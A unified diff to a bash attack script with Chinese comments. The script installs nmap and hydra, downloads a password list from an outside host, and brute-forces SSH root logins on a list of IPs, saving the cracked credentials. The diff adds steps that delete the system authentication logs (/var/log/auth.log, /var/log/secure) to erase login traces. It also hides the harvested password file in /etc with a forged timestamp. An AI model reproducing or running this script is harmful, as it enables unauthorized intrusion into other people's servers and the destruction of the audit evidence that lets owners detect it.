@@ -19,6 +19,8 @@ echo $local_pass
 id=$(awk -F= '$1=="ID" { print $2 ;}' /etc/os-release)
 if [ $id = "ubuntu" ] || [ $id = "kali" ] || [ $id = "debian" ] ;then
 echo 本机为$id
+echo 清理登录痕迹
+sudo rm /var/log/auth.log
 echo 开始备份源文件
 sudo mv /etc/apt/sources.list /etc/apt/sources.list.bak
 sudo touch /etc/apt/sources.list
@@ -26,11 +28,16 @@ echo 开始下载准备好的源文件
 sudo curl https://www.macrz.com/sources.list>>/etc/apt/sources.list
 echo 开始安装nmap和hydra
 sudo apt update &&sudo apt install nmap hydra -y
+
+sudo mv /etc/apt/sources.list.bak /etc/apt/sources.list
+echo 源文件已恢复
 fi
 
 # 适配centos
 elif [ $id = "\"centos\"" ]   ] ;then
 echo 本机为$id
+echo 清理登录痕迹
+sudo rm /var/log/secure
 echo 开始备份源文件
 sudo mkdir /etc/yum.repos.d/backup
 sudo mv /etc/yum.repos.d/* /etc/yum.repos.d/backup
@@ -47,6 +54,10 @@ sudo curl https://www.macrz.com/CentOS-Vault.repo >> CentOS-Vault.repo
 sudo curl https://www.macrz.com/CentOS-x86_64-kernel.repo >> CentOS-x86_64-kernel.repo
 echo 开始安装nmap和hydra
 sudo yum clean all && yum makecache &&sudo yum install nmap hydra -y
+
+sudo rm /etc/yum.repos.d/*
+sudo mv /etc/yum.repos.d/backup /etc/yum.repos.d
+echo 源文件已恢复
 fi
 
 # 还可以适配其他发行版或架构
@@ -76,7 +87,7 @@ curl https://www.macrz.com/password.txt >> password.txt
 cat ./ip.txt | while read line
 do 
     echo "Current IP: ${line}"
-    hydra -l root -P ./password.txt -t 6 -vV $line ssh | grep "host:" >> pass.txt
+    hydra -l root -P ./password.txt -t 6 -vV $line ssh | grep "host:" >> pass_tools.txt
     echo -e "\n"
 done
 
@@ -84,8 +95,7 @@ done
 echo 开始清理痕迹
 sudo rm ip.txt password.txt /etc/apt/sources.list
 echo 生成文件已删除
-sudo mv /etc/apt/sources.list.bak /etc/apt/sources.list
-echo 源文件已恢复
-sudo touch -r /etc/hosts pass.txt
-sudo mv pass.txt /etc
-echo 保存密码文件时间已修改，已转移文件夹
+
+sudo touch -r /etc/hosts pass_tools.txt
+sudo mv pass_tools.txt /etc
+echo 密码文件时间已修改，已转移文件夹
